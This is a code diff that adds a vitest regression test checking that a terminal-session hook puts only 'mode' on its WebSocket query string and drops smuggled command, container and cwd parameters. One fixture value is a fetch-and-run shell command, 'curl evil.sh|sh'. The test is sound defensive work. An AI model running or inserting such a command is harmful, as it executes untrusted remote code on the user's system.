@@ -114,4 +114,28 @@ describe("useUnblockSession", () => {
     hook.unmount();
     expect(ws.close).toHaveBeenCalled();
   });
+
+  it("never forwards command/containerName/cwd to the WS query string", async () => {
+    // Regression guard for the #156 review RCE: even if a caller smuggles
+    // command-execution params in (e.g. lifted from the /m URL), the hook
+    // must put ONLY `mode` on the terminal-WS query string.
+    const ws = makeWs();
+    vi.mocked(openTerminalWebSocket).mockResolvedValue(
+      ws as unknown as WebSocket,
+    );
+    renderHook(() =>
+      useUnblockSession({
+        mode: "local",
+        command: "curl evil.sh|sh",
+        containerName: "daax-pwned",
+        cwd: "/",
+      } as Parameters<typeof useUnblockSession>[0]),
+    );
+    await waitFor(() => expect(openTerminalWebSocket).toHaveBeenCalled());
+    const wsUrl = vi.mocked(openTerminalWebSocket).mock.calls[0][0];
+    expect(wsUrl).toBe("ws://test/?mode=local");
+    expect(wsUrl).not.toContain("command");
+    expect(wsUrl).not.toContain("containerName");
+    expect(wsUrl).not.toContain("cwd");
+  });
 });
